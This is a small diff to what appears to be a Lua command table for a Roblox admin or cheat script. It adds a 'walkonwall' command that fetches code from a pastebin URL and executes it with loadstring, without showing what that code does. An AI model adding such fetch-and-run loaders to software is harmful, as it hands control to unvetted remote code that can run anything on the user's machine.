@@ -3795,6 +3795,10 @@ end
 
 setClip()
 end,
+
+["walkonwall"] = function()
+loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
+end,
 }
 
 -- End Command!
